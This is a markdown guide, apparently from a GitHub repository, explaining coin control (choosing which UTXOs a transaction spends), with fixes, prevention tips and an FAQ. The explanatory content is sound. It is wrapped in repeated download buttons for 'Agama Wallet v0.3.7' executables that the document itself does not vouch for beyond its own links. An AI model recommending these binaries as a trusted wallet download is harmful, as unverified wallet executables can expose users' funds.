[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# Coin Control: Choosing Which UTXOs a Transaction Spends

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

Coin control is the ability to pick which unspent outputs a payment consumes instead of letting the wallet choose automatically. It matters when a payment needs one large output, when outputs should stay unlinked, or when automatic selection produces a fee that looks wrong. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps, and it spends discrete outputs like any UTXO wallet.

## You'll see this if

A wallet sends a payment and the fee is larger than expected, or a payment draws on an output you wanted to keep untouched. Both happen because automatic selection optimises for "enough to cover the amount", not for what the user intended.

| What you see | What automatic selection did | What coin control changes |
|---|---|---|
| Fee much larger than the amount sent | Combined several small outputs | Choose one output that covers it |
| A large output spent for a small payment | Picked the first suitable output | Keep the large output, spend smaller ones |
| Two unrelated payments now visibly linked | Consumed outputs from both | Keep the sets apart |
| Payment refused though funds exist | Could not assemble enough from available outputs | Select exactly the outputs that work |

## Why it happens

A UTXO wallet has no balance to subtract from. To send an amount, it must choose a set of outputs whose total covers the amount plus fee, then create outputs for the recipient and for change.

Automatic selection follows simple heuristics: gather outputs until the total is enough, prefer confirmed ones, avoid creating very small change. Those heuristics are reasonable for ordinary payments and poor for three situations:

- **Fee sensitivity.** Fifty tiny outputs make a large transaction. Manual selection avoids dragging them in.
- **Privacy.** Every input in a transaction is publicly linked to the others. Spending outputs that should not be associated requires choosing them separately.
- **Output preservation.** A user may want to keep a specific output intact, for a large purchase later or to keep an address's history clean.

Komodo's UTXO accounting behaves like Bitcoin's here, including change; the underlying unit is explained in [what a UTXO is](https://github.com/agama-wallet/utxo/blob/main/unspent-transaction-outputs-explained.md).

## Fix

Manual selection is a short procedure wherever the wallet exposes it.

1. **Open the send flow and look for input selection.** It may sit behind an advanced or settings control rather than on the main form.
2. **List the available outputs.** A wallet that exposes coin control shows each unspent output with its amount and confirmation state.
3. **Select outputs that cover the amount plus fee.** Read the running total as you select; leave a margin for the fee.
4. **Check the change.** Whatever is left returns to an address the wallet controls, usually a fresh one.
5. **Review the fee before confirming.** A larger number of selected inputs means a larger transaction; if the fee looks wrong, remove an input.
6. **Record why you selected them.** If the reason was privacy or preservation, a note is the only reminder that survives.

If the wallet offers no manual selection, the same outcome is reached indirectly: send the exact amount from an address holding only the outputs you want spent, or consolidate the unwanted set separately as described in [UTXO management](https://github.com/agama-wallet/utxo/blob/main/consolidating-your-coins.md).

## If that did not work

If a manually assembled payment will not broadcast, one of the selected outputs is probably unconfirmed or already spent by a pending transaction. Deselect it and rebuild.

If the wallet shows a spendable total that does not match the sum of the outputs you can see, some outputs are locked, immature or reserved. [Why a UTXO balance is not one number](https://github.com/agama-wallet/utxo/blob/main/why-balance-is-not-one-number.md) separates those categories.

If a payment succeeded but the balance looks wrong afterwards, check for a pending change output rather than assuming a loss. A restored wallet showing nothing at all is a different problem, handled in [zero balance after restoring](https://github.com/agama-wallet/agama-wallet/blob/main/zero-balance-after-restore.md).

## Prevention

- **Keep outputs separated by purpose.** Payments that should not be linked should not sit in one heap.
- **Do not consolidate before checking what manual selection could do.** Merging removes the option permanently.
- **Select inputs before amounts where the wallet allows it.** Choosing outputs first makes the fee predictable.
- **Watch the change address.** A new address in your own history is normal and is yours.
- **Revisit after a fee spike.** Selection that was cheap last month may be expensive now.
- **Leave dust alone.** An output too small to pay for its own inclusion is not worth rescuing until fees drop.

## FAQ

### Is coin control the same as choosing a change address?

No. Coin control chooses which outputs are consumed; change-address control chooses where the remainder goes. Some wallets offer both, and they solve different problems.

### Does manual selection save fees?

It can, by avoiding a transaction built from many small inputs. It can also cost more if the hand-picked set is larger than what automatic selection would have used, so check the fee after selecting.

### Can coin control make a payment more private?

It can keep unrelated outputs out of the same transaction, which avoids creating a public link between them. It cannot hide the transaction itself, and the amounts and addresses remain visible on-chain.

### What counts as a dust output?

An output is dust when spending it costs more in fee than it is worth. Such outputs sit in the wallet and are ignored by selection; they are not lost, but they cannot contribute to a payment until fees fall low enough to make them worth including.

### Why does my wallet not show coin control at all?

Many wallets hide it to keep the send form simple. Where it is absent, the practical alternative is to keep separate wallets or separate address sets for different purposes and spend from the one that holds the right outputs.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [What Is a UTXO? Unspent Transaction Outputs Explained](https://github.com/agama-wallet/utxo/blob/main/unspent-transaction-outputs-explained.md)
- [UTXO Management: Consolidating and Labelling Your Coins](https://github.com/agama-wallet/utxo/blob/main/consolidating-your-coins.md)
- [Why a UTXO Wallet Balance Is Not One Number](https://github.com/agama-wallet/utxo/blob/main/why-balance-is-not-one-number.md)
- [What Is an Atomic Swap? Exchange Without an Intermediary](https://github.com/agama-wallet/atomic-swaps/blob/main/exchange-without-an-intermediary.md)
